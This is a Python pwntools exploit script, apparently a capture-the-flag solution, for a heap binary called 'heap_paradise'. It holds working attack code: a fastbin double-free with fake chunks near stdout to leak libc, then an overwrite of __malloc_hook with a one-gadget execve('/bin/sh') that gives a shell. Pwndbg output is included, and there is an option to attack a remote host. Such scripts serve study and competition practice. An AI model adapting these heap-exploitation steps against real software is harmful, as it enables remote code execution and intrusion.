#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('heap_paradise')
libc = exe.libc
context.terminal = ['gnome-terminal', '--maximize', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
pwndbg> find-fake-fast stdout
Searching for fastbin size fields up to 0x80, starting at 0x7ffff7bc45a8 resulting in an overlap of 0x7ffff7bc4620
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7bc45dd
prev_size: 0xfff7bc3660000000
size: 0x78 (with flag bits: 0x7f)
fd: 0x00
bk: 0x00
fd_nextsize: 0x00
bk_nextsize: 0x00

pwndbg> find-fake-fast &__malloc_hook
Searching for fastbin size fields up to 0x80, starting at 0x7ffff7bc3a98 resulting in an overlap of 0x7ffff7bc3b10
FAKE CHUNKS
Fake chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7bc3aed
prev_size: 0xfff7bc2260000000
size: 0x78 (with flag bits: 0x7f)
fd: 0xfff7885270000000
bk: 0xfff7884e5000007f
fd_nextsize: 0x7f
bk_nextsize: 0x00

0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
"""

def init():
    global io

    io = start()

def allocate(size, data):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", data)

def free(idx):
    io.sendlineafter(b":", b"2")
    io.sendlineafter(b":", str(idx).encode()) 

def parse(leak):
    mem = [leak[i:i+8] for i in range(0, len(leak), 8)]
    return mem

def solve():

    allocate(0x68, p64(0) * 7 + p64(0x71))
    allocate(0x68, b"A"*8 + p64(0) * 6 + p64(0x31))
    allocate(0x30, b"B"*8 + p64(0) * 2 + p64(0x21))

    free(0)
    free(1)
    free(0)

    allocate(0x68, b"\x40")
    allocate(0x68, b"pad1")
    allocate(0x68, b"pad2")
    allocate(0x68, b"A"*(8*5) + p64(0x91))

    free(1)
    free(6)

    allocate(0x68, b"B"*(8*5) + p64(0x71) + p16(0x45dd))
    free(0)
    free(7)
    free(0)

    allocate(0x68, b"\x70")

    for _ in range(2):
        allocate(0x68, b"A"*8)

    allocate(0x68, b"A")
    allocate(0x68, b"A"*((8*6)+3) + p64(0xfbad1887) + p64(0)*3 + p8(0))
    leak = parse(io.recvline())
    mem = u64(leak[8])
    libc.address = mem - 0x3c4600
    info("libc base: %#x", libc.address)

    free(1)
    free(7)

    allocate(0x68, b"A"*(8*5) + p64(0x71) + p64(libc.address + 0x3c3aed))
    for _ in range(2):
        allocate(0x68, b"A"*(8*2) + b"A"*3 + p64(libc.address + 0xef6c4)) # write one gadget to __malloc_hook

    free(15)

    io.interactive()

def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

